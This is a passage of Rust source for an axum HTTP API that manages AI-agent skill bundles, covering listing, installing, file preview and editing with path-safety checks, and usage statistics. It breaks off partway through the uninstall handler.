use anyhow::{anyhow, Context as _, Result};
use axum::{
    extract::{Path as AxumPath, Query, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use std::{
    fs,
    io::Read,
    path::{Component, Path, PathBuf},
    sync::Arc,
};
use walkdir::WalkDir;

use memorph::skills::{
    conflicts, context, coverage, discovery, graph, health,
    invocation::{self, StatsQuery},
    prune,
    repository::{self, CatalogQuery},
    scanner::{self, ScanMode},
};

#[derive(Clone)]
struct SkillsState {
    agents: Arc<Vec<memorph::skills::inspection::SkillAgent>>,
    database_path: Option<Arc<PathBuf>>,
}

#[derive(Debug, Deserialize, Serialize)]
struct SkillMutation {
    skill_id: String,
    used_by: String,
    #[serde(default)]
    source_used_by: Option<String>,
}

#[derive(Serialize)]
struct ApiResponse<T: Serialize> {
    ok: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<T>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

impl<T: Serialize> ApiResponse<T> {
    fn success(data: T) -> Json<Self> {
        Json(Self {
            ok: true,
            data: Some(data),
            error: None,
        })
    }
}

pub fn router() -> Router {
    router_with_state(default_agents(), None)
}

#[cfg(test)]
fn router_for(agents: Vec<memorph::skills::inspection::SkillAgent>) -> Router {
    let database_path = agents
        .first()
        .and_then(|agent| agent.skills_dir.parent()?.parent())
        .map(|root| root.join("memorph-skills-test.db"));
    router_with_state(agents, database_path)
}

fn router_with_state(
    agents: Vec<memorph::skills::inspection::SkillAgent>,
    database_path: Option<PathBuf>,
) -> Router {
    Router::new()
        .route("/api/v1/skills", get(list_skills))
        .route("/api/v1/skills/catalog", get(list_skills))
        .route("/api/v1/skills/scan", post(scan_skills))
        .route("/api/v1/skills/analyze", post(analyze_skills))
        .route("/api/v1/skills/stats/summary", get(get_stats_summary))
        .route("/api/v1/skills/context/summary", get(get_context_summary))
        .route(
            "/api/v1/skills/conflicts",
            get(get_conflicts).post(check_conflicts),
        )
        .route("/api/v1/skills/coverage/summary", get(get_coverage_summary))
        .route("/api/v1/skills/prune/preview", post(preview_prune))
        .route("/api/v1/skills/prune/execute", post(execute_prune))
        .route(
            "/api/v1/skills/health/summary",
            get(get_health_summary).post(check_health_summary),
        )
        .route("/api/v1/skills/stats/daily", get(get_stats_daily))
        .route("/api/v1/skills/stats/breakdown", get(get_stats_breakdown))
        .route("/api/v1/skills/graph", get(get_skill_graph))
        .route("/api/v1/skills/stats/ranking", get(get_stats_ranking))
        .route("/api/v1/skills/{skill_id}", get(get_skill))
        .route("/api/v1/skills/detail/{skill_id}", get(get_skill))
        .route("/api/v1/skills/{skill_id}/tree", get(get_skill_tree))
        .route("/api/v1/skills/detail/{skill_id}/tree", get(get_skill_tree))
        .route(
            "/api/v1/skills/{skill_id}/file",
            get(get_skill_file).put(put_skill_file),
        )
        .route(
            "/api/v1/skills/detail/{skill_id}/file",
            get(get_skill_file).put(put_skill_file),
        )
        .route(
            "/api/v1/skills/{skill_id}/invocations",
            get(get_skill_invocations),
        )
        .route("/api/v1/skills/{skill_id}/context", get(get_skill_context))
        .route(
            "/api/v1/skills/{skill_id}/conflicts",
            get(get_skill_conflicts),
        )
        .route(
            "/api/v1/skills/{skill_id}/coverage",
            get(get_skill_coverage),
        )
        .route(
            "/api/v1/skills/{skill_id}/coverage/{target_key}/evidence",
            get(get_coverage_evidence),
        )
        .route(
            "/api/v1/skills/{skill_id}/health",
            get(get_skill_health).post(check_skill_health),
        )
        .route(
            "/api/v1/skills/install",
            post(install_skill).delete(uninstall_skill),
        )
        .with_state(SkillsState {
            agents: Arc::new(agents),
            database_path: database_path.map(Arc::new),
        })
}

fn default_agents() -> Vec<memorph::skills::inspection::SkillAgent> {
    let home = dirs::home_dir().unwrap_or_default();
    discovery::agents(&home, None)
}

fn agent_id_for_used_by(used_by: &str) -> &str {
    if used_by == "all" {
        "agents-shared"
    } else {
        used_by
    }
}

fn discover(
    agents: &[memorph::skills::inspection::SkillAgent],
) -> memorph::skills::inspection::SkillsOverview {
    discovery::discover(agents)
}

fn image_mime_type(ext: &str) -> &'static str {
    match ext.to_ascii_lowercase().as_str() {
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "svg" => "image/svg+xml",
        "ico" => "image/x-icon",
        "bmp" => "image/bmp",
        _ => "application/octet-stream",
    }
}

fn bundle_detail(
    overview: &memorph::skills::inspection::SkillsOverview,
    id: &str,
) -> Result<memorph::skills::inspection::SkillDetail> {
    let skill = overview
        .skills
        .iter()
        .find(|skill| skill.id == id)
        .cloned()
        .ok_or_else(|| anyhow!("Unknown skill: {id}"))?;
    let source = skill
        .installations
        .first()
        .ok_or_else(|| anyhow!("Skill has no installation"))?;
    let inspection = memorph::skills::inspection::inspect_bundle(&source.path);
    Ok(memorph::skills::inspection::SkillDetail {
        frontmatter: memorph::skills::inspection::read_frontmatter(&source.path.join("SKILL.md")),
        provider_metadata: inspection
            .assets
            .iter()
            .filter(|asset| asset.category == "metadata")
            .cloned()
            .collect(),
        skill,
        tags: Vec::new(),
        used_by: Vec::new(),
    })
}

fn catalog_detail(
    state: &SkillsState,
    id: &str,
) -> Result<memorph::skills::inspection::SkillDetail> {
    let item = match state.database_path.as_deref() {
        Some(path) => repository::get_catalog_item_path(path, id)?,
        None => repository::get_catalog_item_default(id)?,
    }
    .ok_or_else(|| anyhow!("Unknown skill: {id}"))?;
    let installation = item
        .installations
        .iter()
        .find(|item| item.status == "active")
        .or_else(|| item.installations.first())
        .ok_or_else(|| anyhow!("Skill has no installation"))?;
    let path = PathBuf::from(&installation.install_path);
    let inspection = memorph::skills::inspection::inspect_bundle(&path);
    let skill = memorph::skills::inspection::SkillEntry {
        id: item.id.clone(),
        name: item.name,
        description: item.description,
        directory: path.to_string_lossy().into_owned(),
        fingerprint: item.bundle_hash,
        conflict: item.tags.iter().any(|tag| tag == "conflict"),
        statistics: inspection.statistics.clone(),
        issues: inspection.issues.clone(),
        installations: vec![],
    };
    Ok(memorph::skills::inspection::SkillDetail {
        frontmatter: memorph::skills::inspection::read_frontmatter(&path.join("SKILL.md")),
        provider_metadata: inspection
            .assets
            .iter()
            .filter(|asset| asset.category == "metadata")
            .cloned()
            .collect(),
        tags: item.tags,
        used_by: item.used_by,
        skill,
    })
}

fn validate_directory(directory: &str) -> Result<()> {
    let path = Path::new(directory);
    if directory.is_empty()
        || directory == "."
        || directory == ".."
        || path.components().count() != 1
        || !matches!(path.components().next(), Some(Component::Normal(_)))
    {
        return Err(anyhow!("Unsafe skill directory: {directory}"));
    }
    Ok(())
}

fn install(
    agents: &[memorph::skills::inspection::SkillAgent],
    request: &SkillMutation,
) -> Result<memorph::skills::inspection::SkillsOverview> {
    let overview = discover(agents);
    let skill = overview
        .skills
        .iter()
        .find(|skill| skill.id == request.skill_id)
        .ok_or_else(|| anyhow!("Unknown skill: {}", request.skill_id))?;
    validate_directory(&skill.directory)?;
    let source = match request.source_used_by.as_deref() {
        Some(used_by) => skill
            .installations
            .iter()
            .find(|installation| installation.used_by == used_by)
            .ok_or_else(|| anyhow!("Skill is not installed for source used_by: {used_by}"))?,
        None if skill.conflict => {
            return Err(anyhow!(
                "Skill installations contain different content; source_used_by is required"
            ));
        }
        None => skill
            .installations
            .first()
            .ok_or_else(|| anyhow!("Skill has no source installation"))?,
    };
    let agent = agents
        .iter()
        .find(|agent| agent.agent_id == agent_id_for_used_by(&request.used_by))
        .ok_or_else(|| anyhow!("Unknown skill used_by: {}", request.used_by))?;
    let destination = agent.skills_dir.join(&skill.directory);
    if destination.exists() {
        return Err(anyhow!(
            "Skill {} is already installed for {}",
            skill.name,
            agent.name
        ));
    }

    deploy_skill(&source.path, &destination)?;
    Ok(discover(agents))
}

fn deploy_skill(source: &Path, destination: &Path) -> Result<()> {
    let source = source
        .canonicalize()
        .with_context(|| format!("Failed to resolve {}", source.display()))?;
    let parent = destination
        .parent()
        .ok_or_else(|| anyhow!("Skill destination has no parent"))?;
    fs::create_dir_all(parent).with_context(|| format!("Failed to create {}", parent.display()))?;

    if create_directory_symlink(&source, destination).is_ok() {
        return Ok(());
    }

    copy_skill(&source, destination)?;
    if let Err(error) = fs::write(
        destination.join(memorph::skills::inspection::MANAGED_MARKER),
        b"managed by memorph\n",
    ) {
        let _ = fs::remove_dir_all(destination);
        return Err(error).with_context(|| format!("Failed to mark {}", destination.display()));
    }
    Ok(())
}

#[cfg(unix)]
fn create_directory_symlink(source: &Path, destination: &Path) -> std::io::Result<()> {
    std::os::unix::fs::symlink(source, destination)
}

#[cfg(windows)]
fn create_directory_symlink(source: &Path, destination: &Path) -> std::io::Result<()> {
    std::os::windows::fs::symlink_dir(source, destination)
}

fn copy_skill(source: &Path, destination: &Path) -> Result<()> {
    let source = source
        .canonicalize()
        .with_context(|| format!("Failed to resolve {}", source.display()))?;
    let parent = destination
        .parent()
        .ok_or_else(|| anyhow!("Skill destination has no parent"))?;
    fs::create_dir_all(parent).with_context(|| format!("Failed to create {}", parent.display()))?;
    fs::create_dir(destination)
        .with_context(|| format!("Failed to create {}", destination.display()))?;

    let result = (|| {
        for entry in WalkDir::new(&source).min_depth(1).follow_links(false) {
            let entry = entry?;
            if entry.path().is_symlink() {
                return Err(anyhow!(
                    "Skill contains an unsupported symbolic link: {}",
                    entry.path().display()
                ));
            }
            let relative = entry.path().strip_prefix(&source)?;
            let target = destination.join(relative);
            if entry.file_type().is_dir() {
                fs::create_dir(&target)?;
            } else if entry.file_type().is_file() {
                fs::copy(entry.path(), &target)?;
            }
        }
        Ok(())
    })();
    if result.is_err() {
        let _ = fs::remove_dir_all(destination);
    }
    result
}

fn uninstall(
    agents: &[memorph::skills::inspection::SkillAgent],
    request: &SkillMutation,
) -> Result<memorph::skills::inspection::SkillsOverview> {
    let overview = discover(agents);
    let skill = overview
        .skills
        .iter()
        .find(|skill| skill.id == request.skill_id)
        .ok_or_else(|| anyhow!("Unknown skill: {}", request.skill_id))?;
    let agent = agents
        .iter()
        .find(|agent| agent.agent_id == agent_id_for_used_by(&request.used_by))
        .ok_or_else(|| anyhow!("Unknown skill used_by: {}", request.used_by))?;
    let installation = skill
        .installations
        .iter()
        .find(|installation| installation.used_by == request.used_by)
        .ok_or_else(|| anyhow!("Skill is not installed for {}", agent.name))?;
    let directory = installation
        .path
        .file_name()
        .and_then(|value| value.to_str())
        .ok_or_else(|| anyhow!("Skill installation has no directory name"))?;
    validate_directory(directory)?;
    let expected = agent.skills_dir.join(directory);
    if installation.path != expected || !installation.managed {
        return Err(anyhow!("Refusing to remove a user-owned skill"));
    }
    if expected
        .symlink_metadata()
        .is_ok_and(|metadata| metadata.file_type().is_symlink())
    {
        fs::remove_file(&expected)
            .with_context(|| format!("Failed to remove symbolic link {}", expected.display()))?;
    } else if expected
        .join(memorph::skills::inspection::MANAGED_MARKER)
        .is_file()
    {
        fs::remove_dir_all(&expected)
            .with_context(|| format!("Failed to remove {}", expected.display()))?;
    } else {
        return Err(anyhow!("Refusing to remove a user-owned skill"));
    }
    Ok(discover(agents))
}

#[derive(Debug, Deserialize)]
struct SkillFileQuery {
    path: String,
    used_by: Option<String>,
}

#[derive(Debug, Serialize)]
struct SkillFilePreview {
    path: String,
    category: String,
    extension: Option<String>,
    bytes: u64,
    /// `text` for UTF-8 sources; `base64` for binary image previews.
    encoding: String,
    mime_type: Option<String>,
    content: String,
}

fn resolve_skill_bundle_path(
    state: &SkillsState,
    skill_id: &str,
    used_by: Option<&str>,
) -> Result<PathBuf> {
    let overview = discover(&state.agents);
    if let Some(skill) = overview.skills.iter().find(|skill| skill.id == skill_id) {
        let installation = match used_by {
            Some(agent) => skill
                .installations
                .iter()
                .find(|item| item.used_by == agent)
                .ok_or_else(|| anyhow!("Skill is not installed for {agent}"))?,
            None => skill
                .installations
                .first()
                .ok_or_else(|| anyhow!("Skill has no installation"))?,
        };
        return Ok(installation.path.clone());
    }

    let item = match state.database_path.as_deref() {
        Some(path) => repository::get_catalog_item_path(path, skill_id)?,
        None => repository::get_catalog_item_default(skill_id)?,
    }
    .ok_or_else(|| anyhow!("Unknown skill: {skill_id}"))?;
    let installation = match used_by {
        Some(agent) => item
            .installations
            .iter()
            .find(|item| item.status == "active" && item.used_by == agent)
            .or_else(|| item.installations.iter().find(|item| item.used_by == agent))
            .ok_or_else(|| anyhow!("Skill is not installed for {agent}"))?,
        None => item
            .installations
            .iter()
            .find(|item| item.status == "active")
            .or_else(|| item.installations.first())
            .ok_or_else(|| anyhow!("Skill has no installation"))?,
    };
    Ok(PathBuf::from(&installation.install_path))
}

fn resolve_skill_file(
    state: &SkillsState,
    skill_id: &str,
    query: &SkillFileQuery,
) -> Result<(memorph::skills::inspection::SkillAsset, PathBuf)> {
    let bundle_path = resolve_skill_bundle_path(state, skill_id, query.used_by.as_deref())?;
    let relative = Path::new(&query.path);
    if relative.is_absolute()
        || relative.components().count() == 0
        || relative
            .components()
            .any(|component| !matches!(component, Component::Normal(_)))
    {
        return Err(anyhow!("Unsafe skill file path"));
    }
    let inspection = memorph::skills::inspection::inspect_bundle(&bundle_path);
    let asset = inspection
        .assets
        .iter()
        .find(|asset| asset.path == query.path)
        .ok_or_else(|| anyhow!("Unknown skill asset: {}", query.path))?
        .clone();
    if !asset.previewable {
        return Err(anyhow!("Skill asset is not previewable"));
    }
    let root = bundle_path.canonicalize()?;
    let target = root.join(relative).canonicalize()?;
    if !target.starts_with(&root) {
        return Err(anyhow!("Skill file escapes its bundle"));
    }
    Ok((asset, target))
}

fn preview_file(
    state: &SkillsState,
    skill_id: &str,
    query: &SkillFileQuery,
) -> Result<SkillFilePreview> {
    let (asset, target) = resolve_skill_file(state, skill_id, query)?;
    let file = fs::File::open(&target)?;
    let mut bytes = Vec::new();
    file.take(memorph::skills::inspection::MAX_PREVIEW_BYTES + 1)
        .read_to_end(&mut bytes)?;
    if bytes.len() as u64 > memorph::skills::inspection::MAX_PREVIEW_BYTES {
        return Err(anyhow!("Skill asset exceeds preview limit"));
    }

    let extension = asset.extension.as_deref().unwrap_or("");
    let (encoding, mime_type, content) =
        if memorph::skills::inspection::is_image_extension(extension) {
            use base64::{engine::general_purpose::STANDARD, Engine as _};
            (
                "base64".to_string(),
                Some(image_mime_type(extension).to_string()),
                STANDARD.encode(&bytes),
            )
        } else {
            let text =
                String::from_utf8(bytes).map_err(|_| anyhow!("Skill asset is not UTF-8 text"))?;
            ("text".to_string(), None, text)
        };

    Ok(SkillFilePreview {
        path: asset.path.clone(),
        category: asset.category.clone(),
        extension: asset.extension.clone(),
        bytes: asset.bytes,
        encoding,
        mime_type,
        content,
    })
}

#[derive(Debug, Deserialize)]
struct SkillFileUpdate {
    content: String,
}

fn write_skill_file(
    state: &SkillsState,
    skill_id: &str,
    query: &SkillFileQuery,
    update: &SkillFileUpdate,
) -> Result<SkillFilePreview> {
    let (asset, target) = resolve_skill_file(state, skill_id, query)?;
    let extension = asset.extension.as_deref().unwrap_or("");
    if memorph::skills::inspection::is_image_extension(extension) {
        return Err(anyhow!("Skill asset is not editable"));
    }
    if update.content.len() as u64 > memorph::skills::inspection::MAX_PREVIEW_BYTES {
        return Err(anyhow!("Skill asset exceeds preview limit"));
    }
    if update.content.contains('\0') {
        return Err(anyhow!("Skill asset is not UTF-8 text"));
    }
    memorph::storage::atomic_write::write_string_atomic(&target, &update.content)?;
    preview_file(state, skill_id, query)
}

async fn get_skill(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
) -> impl IntoResponse {
    match bundle_detail(&discover(&state.agents), &skill_id)
        .or_else(|_| catalog_detail(&state, &skill_id))
    {
        Ok(detail) => ApiResponse::success(detail).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_skill_tree(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
) -> impl IntoResponse {
    match resolve_skill_bundle_path(&state, &skill_id, None) {
        Ok(path) => {
            let inspection = memorph::skills::inspection::inspect_bundle(&path);
            ApiResponse::success(memorph::skills::inspection::SkillTree {
                skill_id,
                fingerprint: inspection.fingerprint,
                assets: inspection.assets,
                issues: inspection.issues,
            })
            .into_response()
        }
        Err(error) => error_response(error),
    }
}

async fn get_skill_file(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
    Query(query): Query<SkillFileQuery>,
) -> impl IntoResponse {
    match preview_file(&state, &skill_id, &query) {
        Ok(preview) => ApiResponse::success(preview).into_response(),
        Err(error) => error_response(error),
    }
}

async fn put_skill_file(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
    Query(query): Query<SkillFileQuery>,
    Json(update): Json<SkillFileUpdate>,
) -> impl IntoResponse {
    match write_skill_file(&state, &skill_id, &query, &update) {
        Ok(preview) => ApiResponse::success(preview).into_response(),
        Err(error) => error_response(error),
    }
}

#[derive(Debug, Deserialize)]
struct SkillScanRequest {
    #[serde(default)]
    mode: Option<ScanMode>,
    #[serde(default)]
    workspace: Option<PathBuf>,
}

async fn scan_skills(
    State(state): State<SkillsState>,
    Json(request): Json<SkillScanRequest>,
) -> impl IntoResponse {
    let mut agents = state.agents.as_ref().clone();
    if let Some(workspace) = request.workspace {
        if !workspace.is_absolute() || !workspace.is_dir() {
            return error_response(anyhow!(
                "Skill workspace must be an existing absolute directory"
            ));
        }
        for (agent_id, name, _, relative) in discovery::SKILL_AGENTS {
            if agent_id == "agents-shared" {
                continue;
            }
            agents.push(memorph::skills::inspection::SkillAgent {
                agent_id: agent_id.into(),
                name: name.into(),
                skills_dir: workspace.join(relative),
                scope_kind: "project".into(),
                workspace_dir: Some(workspace.clone()),
            });
        }
    }
    let mode = request.mode.unwrap_or(ScanMode::Incremental);
    let database_path = state
        .database_path
        .as_deref()
        .map(|p| p.as_path().to_path_buf());

    // Non-blocking: build the overview synchronously (cheap — directory walk
    // only), then hand the heavy persist off to a background thread. The
    // request returns immediately with a queued acknowledgement so the UI can
    // poll list_skills and watch needs_scan flip to false.
    let overview =
        match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| discover(&agents))) {
            Ok(value) => value,
            Err(_) => return error_response(anyhow!("Skill discovery failed")),
        };
    let roots_scanned = overview.agents.len();
    let skills_seen = overview.skills.len();
    std::thread::Builder::new()
        .name("memorph-skill-scan".into())
        .spawn(move || {
            let result = match database_path.as_deref() {
                Some(path) => scanner::persist_path(path, &overview, mode),
                None => scanner::persist_default(&overview, mode),
            };
            if let Err(error) = result {
                memorph::logging::error(
                    "skill_scan_background",
                    format!("background skill scan failed: {error:#}"),
                );
            }
        })
        .ok();

    let mode_str = match mode {
        ScanMode::Incremental => "incremental",
        ScanMode::Full => "full",
    };
    ApiResponse::success(SkillScanQueued {
        queued: true,
        mode: mode_str,
        roots_scanned,
        skills_seen,
    })
    .into_response()
}

async fn analyze_skills(
    State(state): State<SkillsState>,
    Json(request): Json<SkillScanRequest>,
) -> impl IntoResponse {
    let mode = request.mode.unwrap_or(ScanMode::Incremental);
    let database_path = state
        .database_path
        .as_deref()
        .map(|p| p.as_path().to_path_buf());
    let force = mode == ScanMode::Full;
    std::thread::Builder::new()
        .name("memorph-skill-analyze".into())
        .spawn(move || {
            let result = match database_path.as_deref() {
                Some(path) => memorph::storage::local_store::LocalSqliteStore::open(path)
                    .and_then(|mut store| invocation::index(store.connection_mut(), force)),
                None => memorph::storage::local_store::LocalSqliteStore::open_default()
                    .and_then(|mut store| invocation::index(store.connection_mut(), force)),
            };
            if let Err(error) = result {
                memorph::logging::error(
                    "skill_analyze_background",
                    format!("background skill analysis failed: {error:#}"),
                );
            }
        })
        .ok();

    let mode = match mode {
        ScanMode::Incremental => "incremental",
        ScanMode::Full => "full",
    };
    ApiResponse::success(SkillAnalyzeQueued { queued: true, mode }).into_response()
}

#[derive(Debug, Serialize)]
struct SkillScanQueued {
    queued: bool,
    mode: &'static str,
    roots_scanned: usize,
    skills_seen: usize,
}

#[derive(Debug, Serialize)]
struct SkillAnalyzeQueued {
    queued: bool,
    mode: &'static str,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct CatalogListQuery {
    query: Option<String>,
    #[serde(rename = "used_by")]
    used_by: Option<String>,
    scope: Option<String>,
    sort: Option<String>,
    order: Option<String>,
    page: Option<usize>,
    page_size: Option<usize>,
}

async fn list_skills(
    State(state): State<SkillsState>,
    Query(query): Query<CatalogListQuery>,
) -> impl IntoResponse {
    let catalog_query = CatalogQuery {
        query: query.query,
        used_by: query.used_by,
        scope: query.scope,
        sort: query.sort,
        descending: query.order.as_deref() == Some("desc"),
        page: query.page.unwrap_or(1),
        page_size: query.page_size.unwrap_or(50),
    };
    let result = match state.database_path.as_deref() {
        Some(path) => repository::list_catalog_path(path, &catalog_query),
        None => repository::list_catalog_default(&catalog_query),
    };
    match result {
        Ok(page) => ApiResponse::success(page).into_response(),
        Err(error) => error_response(error),
    }
}

#[derive(Debug, Default, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SkillStatsQuery {
    from: Option<String>,
    to: Option<String>,
    provider: Option<String>,
    workspace: Option<String>,
    confidence: Option<String>,
    skill_id: Option<String>,
    page: Option<usize>,
    page_size: Option<usize>,
}

impl From<SkillStatsQuery> for StatsQuery {
    fn from(value: SkillStatsQuery) -> Self {
        Self {
            from: value.from,
            to: value.to,
            provider: value.provider,
            workspace: value.workspace,
            confidence: value.confidence,
            page: value.page.unwrap_or(1),
            page_size: value.page_size.unwrap_or(50),
        }
    }
}

fn stats_store(state: &SkillsState) -> Result<memorph::storage::local_store::LocalSqliteStore> {
    match state.database_path.as_deref() {
        Some(path) => memorph::storage::local_store::LocalSqliteStore::open(path),
        None => memorph::storage::local_store::LocalSqliteStore::open_default(),
    }
}

#[derive(Debug, Default, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SkillGraphQuery {
    from: Option<String>,
    to: Option<String>,
    skill_id: Option<String>,
    provider: Option<String>,
    workspace: Option<String>,
    timezone: Option<String>,
}
async fn get_skill_graph(
    State(state): State<SkillsState>,
    Query(query): Query<SkillGraphQuery>,
) -> impl IntoResponse {
    let query = graph::GraphQuery {
        from: query.from,
        to: query.to,
        skill_id: query.skill_id,
        provider: query.provider,
        workspace: query.workspace,
        timezone: query.timezone,
    };
    match stats_store(&state).and_then(|store| graph::graph(store.connection(), &query)) {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

#[derive(Debug, Default, Deserialize)]
struct PrunePreviewRequest {
    days: Option<u32>,
}
async fn preview_prune(
    State(state): State<SkillsState>,
    Json(request): Json<PrunePreviewRequest>,
) -> impl IntoResponse {
    let result = stats_store(&state)
        .and_then(|store| prune::preview(store.connection(), request.days.unwrap_or(30)));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}
async fn execute_prune(
    State(state): State<SkillsState>,
    Json(request): Json<prune::ExecuteRequest>,
) -> impl IntoResponse {
    let roots = state
        .agents
        .iter()
        .map(|agent| agent.skills_dir.clone())
        .collect::<Vec<_>>();
    let result =
        stats_store(&state).and_then(|store| prune::execute(store.connection(), &roots, &request));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => (
            StatusCode::CONFLICT,
            Json(ApiResponse::<()> {
                ok: false,
                data: None,
                error: Some(error.to_string()),
            }),
        )
            .into_response(),
    }
}

#[derive(Debug, Default, Deserialize)]
struct ConflictQuery {
    severity: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct CoverageQuery {
    #[serde(default = "default_coverage_range")]
    range: String,
    #[serde(rename = "includeLowConfidence", default)]
    include_low_confidence: bool,
}
#[derive(Debug, Default, Deserialize)]
#[serde(rename_all = "camelCase")]
struct CoverageEvidenceQuery {
    page: Option<usize>,
    page_size: Option<usize>,
}
fn default_coverage_range() -> String {
    "90d".into()
}

async fn get_conflicts(
    State(state): State<SkillsState>,
    Query(query): Query<ConflictQuery>,
) -> impl IntoResponse {
    conflict_response(&state, None, query.severity.as_deref())
}
async fn check_conflicts(State(state): State<SkillsState>) -> impl IntoResponse {
    conflict_response(&state, None, None)
}
async fn get_skill_conflicts(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
) -> impl IntoResponse {
    conflict_response(&state, Some(&skill_id), None)
}
fn conflict_response(
    state: &SkillsState,
    skill_id: Option<&str>,
    severity: Option<&str>,
) -> axum::response::Response {
    let result = stats_store(state)
        .and_then(|store| conflicts::list(store.connection(), skill_id))
        .map(|items| {
            items
                .into_iter()
                .filter(|item| severity.is_none_or(|value| item.severity == value))
                .collect::<Vec<_>>()
        });
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}
async fn get_coverage_summary(
    State(state): State<SkillsState>,
    Query(query): Query<CoverageQuery>,
) -> impl IntoResponse {
    let result =
        stats_store(&state).and_then(|store| coverage::summary(store.connection(), &query.range));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}
async fn get_skill_coverage(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
    Query(query): Query<CoverageQuery>,
) -> impl IntoResponse {
    let result = stats_store(&state).and_then(|store| {
        coverage::detail(
            store.connection(),
            &skill_id,
            &query.range,
            query.include_low_confidence,
        )
    });
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}
async fn get_coverage_evidence(
    State(state): State<SkillsState>,
    AxumPath((skill_id, target_key)): AxumPath<(String, String)>,
    Query(query): Query<CoverageEvidenceQuery>,
) -> impl IntoResponse {
    let result = stats_store(&state).and_then(|store| {
        coverage::evidence(
            store.connection(),
            &skill_id,
            &target_key,
            query.page.unwrap_or(1),
            query.page_size.unwrap_or(20),
        )
    });
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

#[derive(Debug, Default, Deserialize)]
struct ContextQuery {
    used_by: Option<String>,
    #[serde(rename = "baselineTokens")]
    baseline_tokens: Option<u64>,
}

async fn get_context_summary(
    State(state): State<SkillsState>,
    Query(query): Query<ContextQuery>,
) -> impl IntoResponse {
    let result = stats_store(&state).and_then(|store| {
        context::summary(
            store.connection(),
            query.used_by.as_deref(),
            query.baseline_tokens,
        )
    });
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_skill_context(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
    Query(query): Query<ContextQuery>,
) -> impl IntoResponse {
    let result = stats_store(&state)
        .and_then(|store| context::detail(store.connection(), &skill_id, query.baseline_tokens));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_health_summary(State(state): State<SkillsState>) -> impl IntoResponse {
    health_summary_response(&state)
}

async fn check_health_summary(State(state): State<SkillsState>) -> impl IntoResponse {
    health_summary_response(&state)
}

fn health_summary_response(state: &SkillsState) -> axum::response::Response {
    let result = stats_store(state).and_then(|store| health::summary(store.connection()));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_skill_health(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
) -> impl IntoResponse {
    skill_health_response(&state, &skill_id)
}

async fn check_skill_health(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
) -> impl IntoResponse {
    skill_health_response(&state, &skill_id)
}

fn skill_health_response(state: &SkillsState, skill_id: &str) -> axum::response::Response {
    let result = stats_store(state).and_then(|store| health::detail(store.connection(), skill_id));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_stats_summary(
    State(state): State<SkillsState>,
    Query(query): Query<SkillStatsQuery>,
) -> impl IntoResponse {
    let result = stats_store(&state)
        .and_then(|store| invocation::summary(store.connection(), &query.into()));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_stats_daily(
    State(state): State<SkillsState>,
    Query(query): Query<SkillStatsQuery>,
) -> impl IntoResponse {
    let skill_id = query.skill_id.clone();
    let result = stats_store(&state).and_then(|store| {
        invocation::daily(store.connection(), &query.into(), skill_id.as_deref())
    });
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_stats_breakdown(
    State(state): State<SkillsState>,
    Query(query): Query<SkillStatsQuery>,
) -> impl IntoResponse {
    let result = stats_store(&state)
        .and_then(|store| invocation::breakdown(store.connection(), &query.into()));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_stats_ranking(
    State(state): State<SkillsState>,
    Query(query): Query<SkillStatsQuery>,
) -> impl IntoResponse {
    let result = stats_store(&state)
        .and_then(|store| invocation::ranking(store.connection(), &query.into()));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn get_skill_invocations(
    State(state): State<SkillsState>,
    AxumPath(skill_id): AxumPath<String>,
    Query(query): Query<SkillStatsQuery>,
) -> impl IntoResponse {
    let result = stats_store(&state)
        .and_then(|store| invocation::invocations(store.connection(), &skill_id, &query.into()));
    match result {
        Ok(value) => ApiResponse::success(value).into_response(),
        Err(error) => error_response(error),
    }
}

async fn install_skill(
    State(state): State<SkillsState>,
    Json(request): Json<SkillMutation>,
) -> impl IntoResponse {
    match install(&state.agents, &request) {
        Ok(overview) => ApiResponse::success(overview).into_response(),
        Err(error) => error_response(error),
    }
}

async fn uninstall_skill(
    State(state): State<SkillsState>,
    Json(request): Json<SkillMutation>,
) -> impl IntoResponse {
